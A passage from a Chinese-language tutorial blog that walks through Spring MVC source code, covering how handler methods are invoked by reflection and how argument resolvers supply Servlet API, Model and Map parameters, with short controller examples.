getReturnValueType(returnValue), mavContainer, webRequest);<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>...<br>&#125;<br>&#125;<br>    <br>    <span class="hljs-meta">@Nullable</span><span class="hljs-comment">//InvocableHandlerMethod类的，ServletInvocableHandlerMethod类继承InvocableHandlerMethod类</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invokeForRequest</span><span class="hljs-params">(NativeWebRequest request, <span class="hljs-meta">@Nullable</span> ModelAndViewContainer mavContainer,</span><br><span class="hljs-params">Object... providedArgs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">////获取方法的参数值</span><br>Object[] args = getMethodArgumentValues(request, mavContainer, providedArgs);<br><br>        ...<br>       <br><span class="hljs-keyword">return</span> doInvoke(args);<br>&#125;<br><br>    <span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">doInvoke</span><span class="hljs-params">(Object... args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> getBridgedMethod();<span class="hljs-comment">//@RequestMapping的方法</span><br>ReflectionUtils.makeAccessible(method);<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-keyword">if</span> (KotlinDetector.isSuspendingFunction(method)) &#123;<br><span class="hljs-keyword">return</span> CoroutinesUtils.invokeSuspendingFunction(method, getBean(), args);<br>&#125;<br>            <span class="hljs-comment">//通过反射调用</span><br><span class="hljs-keyword">return</span> method.invoke(getBean(), args);<span class="hljs-comment">//getBean()指@RequestMapping的方法所在类的对象。</span><br>&#125;<br><span class="hljs-keyword">catch</span> (IllegalArgumentException ex) &#123;<br>...<br>&#125;<br><span class="hljs-keyword">catch</span> (InvocationTargetException ex) &#123;<br>...<br>&#125;<br>&#125;<br>    <br>&#125;   <br></code></pre></td></tr></table></figure><h3 id="如何确定目标方法每一个参数的值"><a href="#如何确定目标方法每一个参数的值" class="headerlink" title="如何确定目标方法每一个参数的值"></a>如何确定目标方法每一个参数的值</h3><p>重点分析<code>ServletInvocableHandlerMethod</code>的<code>getMethodArgumentValues</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServletInvocableHandlerMethod</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InvocableHandlerMethod</span> &#123;<br>    ...<br><br><span class="hljs-meta">@Nullable</span><span class="hljs-comment">//InvocableHandlerMethod类的，ServletInvocableHandlerMethod类继承InvocableHandlerMethod类</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invokeForRequest</span><span class="hljs-params">(NativeWebRequest request, <span class="hljs-meta">@Nullable</span> ModelAndViewContainer mavContainer,</span><br><span class="hljs-params">Object... providedArgs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">////获取方法的参数值</span><br>Object[] args = getMethodArgumentValues(request, mavContainer, providedArgs);<br><br>        ...<br>       <br><span class="hljs-keyword">return</span> doInvoke(args);<br>&#125;<br> <br>    <span class="hljs-comment">//本节重点，获取方法的参数值</span><br><span class="hljs-keyword">protected</span> Object[] getMethodArgumentValues(NativeWebRequest request, <span class="hljs-meta">@Nullable</span> ModelAndViewContainer mavContainer,<br>Object... providedArgs) <span class="hljs-keyword">throws</span> Exception &#123;<br><br>MethodParameter[] parameters = getMethodParameters();<br><span class="hljs-keyword">if</span> (ObjectUtils.isEmpty(parameters)) &#123;<br><span class="hljs-keyword">return</span> EMPTY_ARGS;<br>&#125;<br><br>Object[] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[parameters.length];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; parameters.length; i++) &#123;<br><span class="hljs-type">MethodParameter</span> <span class="hljs-variable">parameter</span> <span class="hljs-operator">=</span> parameters[i];<br>parameter.initParameterNameDiscovery(<span class="hljs-built_in">this</span>.parameterNameDiscoverer);<br>args[i] = findProvidedArgument(parameter, providedArgs);<br><span class="hljs-keyword">if</span> (args[i] != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br>            <span class="hljs-comment">//查看resolvers是否有支持</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.resolvers.supportsParameter(parameter)) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(formatArgumentError(parameter, <span class="hljs-string">&quot;No suitable resolver&quot;</span>));<br>&#125;<br><span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">//支持的话就开始解析吧</span><br>args[i] = <span class="hljs-built_in">this</span>.resolvers.resolveArgument(parameter, mavContainer, request, <span class="hljs-built_in">this</span>.dataBinderFactory);<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>....<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> args;<br>&#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p><code>this.resolvers</code>的类型为<code>HandlerMethodArgumentResolverComposite</code>（在<a href="#">参数解析器</a>章节提及）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HandlerMethodArgumentResolverComposite</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerMethodArgumentResolver</span> &#123;<br>    <br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supportsParameter</span><span class="hljs-params">(MethodParameter parameter)</span> &#123;<br><span class="hljs-keyword">return</span> getArgumentResolver(parameter) != <span class="hljs-literal">null</span>;<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">resolveArgument</span><span class="hljs-params">(MethodParameter parameter, <span class="hljs-meta">@Nullable</span> ModelAndViewContainer mavContainer,</span><br><span class="hljs-params">NativeWebRequest webRequest, <span class="hljs-meta">@Nullable</span> WebDataBinderFactory binderFactory)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-type">HandlerMethodArgumentResolver</span> <span class="hljs-variable">resolver</span> <span class="hljs-operator">=</span> getArgumentResolver(parameter);<br><span class="hljs-keyword">if</span> (resolver == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Unsupported parameter type [&quot;</span> +<br>parameter.getParameterType().getName() + <span class="hljs-string">&quot;]. supportsParameter should be called first.&quot;</span>);<br>&#125;<br><span class="hljs-keyword">return</span> resolver.resolveArgument(parameter, mavContainer, webRequest, binderFactory);<br>&#125;<br>    <br>    <br>    <span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">private</span> HandlerMethodArgumentResolver <span class="hljs-title function_">getArgumentResolver</span><span class="hljs-params">(MethodParameter parameter)</span> &#123;<br><span class="hljs-type">HandlerMethodArgumentResolver</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.argumentResolverCache.get(parameter);<br><span class="hljs-keyword">if</span> (result == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">//挨个判断所有参数解析器那个支持解析这个参数</span><br><span class="hljs-keyword">for</span> (HandlerMethodArgumentResolver resolver : <span class="hljs-built_in">this</span>.argumentResolvers) &#123;<br><span class="hljs-keyword">if</span> (resolver.supportsParameter(parameter)) &#123;<br>result = resolver;<br><span class="hljs-built_in">this</span>.argumentResolverCache.put(parameter, result);<span class="hljs-comment">//找到了，resolver就缓存起来，方便稍后resolveArgument()方法使用</span><br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> result;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>本节描述，一个请求发送到DispatcherServlet后的具体处理流程，也就是SpringMVC的主要原理。</p><p>本节内容较多且硬核，对日后编程很有帮助，需耐心对待。</p><p>可以运行一个示例，打断点，在Debug模式下，查看程序流程。</p><h2 id="33、请求处理-【源码分析】-Servlet-API参数解析原理"><a href="#33、请求处理-【源码分析】-Servlet-API参数解析原理" class="headerlink" title="33、请求处理-【源码分析】-Servlet API参数解析原理"></a>33、请求处理-【源码分析】-Servlet API参数解析原理</h2><ul><li>WebRequest</li><li>ServletRequest</li><li>MultipartRequest</li><li>HttpSession</li><li>javax.servlet.http.PushBuilder</li><li>Principal</li><li>InputStream</li><li>Reader</li><li>HttpMethod</li><li>Locale</li><li>TimeZone</li><li>ZoneId</li></ul><p><strong>ServletRequestMethodArgumentResolver</strong>用来处理以上的参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServletRequestMethodArgumentResolver</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerMethodArgumentResolver</span> &#123;<br><br><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; pushBuilder;<br><br><span class="hljs-keyword">static</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br>pushBuilder = ClassUtils.forName(<span class="hljs-string">&quot;javax.servlet.http.PushBuilder&quot;</span>,<br>ServletRequestMethodArgumentResolver.class.getClassLoader());<br>&#125;<br><span class="hljs-keyword">catch</span> (ClassNotFoundException ex) &#123;<br><span class="hljs-comment">// Servlet 4.0 PushBuilder not found - not supported for injection</span><br>pushBuilder = <span class="hljs-literal">null</span>;<br>&#125;<br>&#125;<br><br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supportsParameter</span><span class="hljs-params">(MethodParameter parameter)</span> &#123;<br>Class&lt;?&gt; paramType = parameter.getParameterType();<br><span class="hljs-keyword">return</span> (WebRequest.class.isAssignableFrom(paramType) ||<br>ServletRequest.class.isAssignableFrom(paramType) ||<br>MultipartRequest.class.isAssignableFrom(paramType) ||<br>HttpSession.class.isAssignableFrom(paramType) ||<br>(pushBuilder != <span class="hljs-literal">null</span> &amp;&amp; pushBuilder.isAssignableFrom(paramType)) ||<br>(Principal.class.isAssignableFrom(paramType) &amp;&amp; !parameter.hasParameterAnnotations()) ||<br>InputStream.class.isAssignableFrom(paramType) ||<br>Reader.class.isAssignableFrom(paramType) ||<br>HttpMethod.class == paramType ||<br>Locale.class == paramType ||<br>TimeZone.class == paramType ||<br>ZoneId.class == paramType);<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">resolveArgument</span><span class="hljs-params">(MethodParameter parameter, <span class="hljs-meta">@Nullable</span> ModelAndViewContainer mavContainer,</span><br><span class="hljs-params">NativeWebRequest webRequest, <span class="hljs-meta">@Nullable</span> WebDataBinderFactory binderFactory)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>Class&lt;?&gt; paramType = parameter.getParameterType();<br><br><span class="hljs-comment">// WebRequest / NativeWebRequest / ServletWebRequest</span><br><span class="hljs-keyword">if</span> (WebRequest.class.isAssignableFrom(paramType)) &#123;<br><span class="hljs-keyword">if</span> (!paramType.isInstance(webRequest)) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<br><span class="hljs-string">&quot;Current request is not of type [&quot;</span> + paramType.getName() + <span class="hljs-string">&quot;]: &quot;</span> + webRequest);<br>&#125;<br><span class="hljs-keyword">return</span> webRequest;<br>&#125;<br><br><span class="hljs-comment">// ServletRequest / HttpServletRequest / MultipartRequest / MultipartHttpServletRequest</span><br><span class="hljs-keyword">if</span> (ServletRequest.class.isAssignableFrom(paramType) || MultipartRequest.class.isAssignableFrom(paramType)) &#123;<br><span class="hljs-keyword">return</span> resolveNativeRequest(webRequest, paramType);<br>&#125;<br><br><span class="hljs-comment">// HttpServletRequest required for all further argument types</span><br><span class="hljs-keyword">return</span> resolveArgument(paramType, resolveNativeRequest(webRequest, HttpServletRequest.class));<br>&#125;<br><br><span class="hljs-keyword">private</span> &lt;T&gt; T <span class="hljs-title function_">resolveNativeRequest</span><span class="hljs-params">(NativeWebRequest webRequest, Class&lt;T&gt; requiredType)</span> &#123;<br><span class="hljs-type">T</span> <span class="hljs-variable">nativeRequest</span> <span class="hljs-operator">=</span> webRequest.getNativeRequest(requiredType);<br><span class="hljs-keyword">if</span> (nativeRequest == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<br><span class="hljs-string">&quot;Current request is not of type [&quot;</span> + requiredType.getName() + <span class="hljs-string">&quot;]: &quot;</span> + webRequest);<br>&#125;<br><span class="hljs-keyword">return</span> nativeRequest;<br>&#125;<br><br><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">private</span> Object <span class="hljs-title function_">resolveArgument</span><span class="hljs-params">(Class&lt;?&gt; paramType, HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><span class="hljs-keyword">if</span> (HttpSession.class.isAssignableFrom(paramType)) &#123;<br><span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> request.getSession();<br><span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span> &amp;&amp; !paramType.isInstance(session)) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<br><span class="hljs-string">&quot;Current session is not of type [&quot;</span> + paramType.getName() + <span class="hljs-string">&quot;]: &quot;</span> + session);<br>&#125;<br><span class="hljs-keyword">return</span> session;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pushBuilder != <span class="hljs-literal">null</span> &amp;&amp; pushBuilder.isAssignableFrom(paramType)) &#123;<br><span class="hljs-keyword">return</span> PushBuilderDelegate.resolvePushBuilder(request, paramType);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (InputStream.class.isAssignableFrom(paramType)) &#123;<br><span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> request.getInputStream();<br><span class="hljs-keyword">if</span> (inputStream != <span class="hljs-literal">null</span> &amp;&amp; !paramType.isInstance(inputStream)) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<br><span class="hljs-string">&quot;Request input stream is not of type [&quot;</span> + paramType.getName() + <span class="hljs-string">&quot;]: &quot;</span> + inputStream);<br>&#125;<br><span class="hljs-keyword">return</span> inputStream;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Reader.class.isAssignableFrom(paramType)) &#123;<br><span class="hljs-type">Reader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> request.getReader();<br><span class="hljs-keyword">if</span> (reader != <span class="hljs-literal">null</span> &amp;&amp; !paramType.isInstance(reader)) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<br><span class="hljs-string">&quot;Request body reader is not of type [&quot;</span> + paramType.getName() + <span class="hljs-string">&quot;]: &quot;</span> + reader);<br>&#125;<br><span class="hljs-keyword">return</span> reader;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Principal.class.isAssignableFrom(paramType)) &#123;<br><span class="hljs-type">Principal</span> <span class="hljs-variable">userPrincipal</span> <span class="hljs-operator">=</span> request.getUserPrincipal();<br><span class="hljs-keyword">if</span> (userPrincipal != <span class="hljs-literal">null</span> &amp;&amp; !paramType.isInstance(userPrincipal)) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<br><span class="hljs-string">&quot;Current user principal is not of type [&quot;</span> + paramType.getName() + <span class="hljs-string">&quot;]: &quot;</span> + userPrincipal);<br>&#125;<br><span class="hljs-keyword">return</span> userPrincipal;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (HttpMethod.class == paramType) &#123;<br><span class="hljs-keyword">return</span> HttpMethod.resolve(request.getMethod());<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Locale.class == paramType) &#123;<br><span class="hljs-keyword">return</span> RequestContextUtils.getLocale(request);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (TimeZone.class == paramType) &#123;<br><span class="hljs-type">TimeZone</span> <span class="hljs-variable">timeZone</span> <span class="hljs-operator">=</span> RequestContextUtils.getTimeZone(request);<br><span class="hljs-keyword">return</span> (timeZone != <span class="hljs-literal">null</span> ? timeZone : TimeZone.getDefault());<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ZoneId.class == paramType) &#123;<br><span class="hljs-type">TimeZone</span> <span class="hljs-variable">timeZone</span> <span class="hljs-operator">=</span> RequestContextUtils.getTimeZone(request);<br><span class="hljs-keyword">return</span> (timeZone != <span class="hljs-literal">null</span> ? timeZone.toZoneId() : ZoneId.systemDefault());<br>&#125;<br><br><span class="hljs-comment">// Should never happen...</span><br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>(<span class="hljs-string">&quot;Unknown parameter type: &quot;</span> + paramType.getName());<br>&#125;<br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Inner class to avoid a hard dependency on Servlet API 4.0 at runtime.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PushBuilderDelegate</span> &#123;<br><br><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">resolvePushBuilder</span><span class="hljs-params">(HttpServletRequest request, Class&lt;?&gt; paramType)</span> &#123;<br><span class="hljs-type">PushBuilder</span> <span class="hljs-variable">pushBuilder</span> <span class="hljs-operator">=</span> request.newPushBuilder();<br><span class="hljs-keyword">if</span> (pushBuilder != <span class="hljs-literal">null</span> &amp;&amp; !paramType.isInstance(pushBuilder)) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<br><span class="hljs-string">&quot;Current push builder is not of type [&quot;</span> + paramType.getName() + <span class="hljs-string">&quot;]: &quot;</span> + pushBuilder);<br>&#125;<br><span class="hljs-keyword">return</span> pushBuilder;<br><br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>用例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/goto&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">goToPage</span><span class="hljs-params">(HttpServletRequest request)</span>&#123;<br><br>        request.setAttribute(<span class="hljs-string">&quot;msg&quot;</span>,<span class="hljs-string">&quot;成功了...&quot;</span>);<br>        request.setAttribute(<span class="hljs-string">&quot;code&quot;</span>,<span class="hljs-number">200</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;forward:/success&quot;</span>;  <span class="hljs-comment">//转发到  /success请求</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="34、请求处理-【源码分析】-Model、Map原理"><a href="#34、请求处理-【源码分析】-Model、Map原理" class="headerlink" title="34、请求处理-【源码分析】-Model、Map原理"></a>34、请求处理-【源码分析】-Model、Map原理</h2><p>复杂参数：</p><ul><li><p><strong>Map</strong></p></li><li><p><strong>Model（map、model里面的数据会被放在request的请求域  request.setAttribute）</strong></p></li><li><p>Errors&#x2F;BindingResult</p></li><li><p><strong>RedirectAttributes（ 重定向携带数据）</strong></p></li><li><p><strong>ServletResponse（response）</strong></p></li><li><p>SessionStatus</p></li><li><p>UriComponentsBuilder</p></li><li><p>ServletUriComponentsBuilder</p></li></ul><p>用例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/params&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">testParam</span><span class="hljs-params">(Map&lt;String,Object&gt; map,</span><br><span class="hljs-params">                        Model model,</span><br><span class="hljs-params">                        HttpServletRequest request,</span><br><span class="hljs-params">                        HttpServletResponse response)</span>&#123;<br>    <span class="hljs-comment">//下面三位都是可以给request域中放数据</span><br>    map.put(<span class="hljs-string">&quot;hello&quot;</span>,<span class="hljs-string">&quot;world666&quot;</span>);<br>    model.addAttribute(<span class="hljs-string">&quot;world&quot;</span>,<span class="hljs-string">&quot;hello666&quot;</span>);<br>    request.setAttribute(<span class="hljs-string">&quot;message&quot;</span>,<span class="hljs-string">&quot;HelloWorld&quot;</span>);<br><br>    <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cookie</span>(<span class="hljs-string">&quot;c1&quot;</span>,<span class="hljs-string">&quot;v1&quot;</span>);<br>    response.addCookie(cookie);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;forward:/success&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-meta">@GetMapping(&quot;/success&quot;)</span><br><span class="hljs-keyword">public</span> Map <span class="hljs-title function_">success</span><span class="hljs-params">(<span class="hljs-meta">@RequestAttribute(value = &quot;msg&quot;,required = false)</span> String msg,</span><br><span class="hljs-params">                   <span class="hljs-meta">@RequestAttribute(value = &quot;code&quot;,required = false)</span>Integer code,</span><br><span class="hljs-params">                   HttpServletRequest request)</span>&#123;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">msg1</span> <span class="hljs-operator">=</span> request.getAttribute(<span class="hljs-string">&quot;msg&quot;</span>);<br><br>    Map&lt;String,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> request.getAttribute(<span class="hljs-string">&quot;hello&quot;</span>);<span class="hljs-comment">//得出testParam方法赋予的值 world666</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">world</span> <span class="hljs-operator">=</span> request.getAttribute(<span class="hljs-string">&quot;world&quot;</span>);<span class="hljs-comment">//得出testParam方法赋予的值 hello666</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> request.getAttribute(<span class="hljs-string">&quot;message&quot;</span>);<span class="hljs-comment">//得出testParam方法赋予的值 HelloWorld</span><br><br>    map.put(<span class="hljs-string">&quot;reqMethod_msg&quot;</span>,msg1);<br>    map.put(<span class="hljs-string">&quot;annotation_msg&quot;</span>,msg);<br>    map.put(<span class="hljs-string">&quot;hello&quot;</span>,hello);<br>    map.put(<span 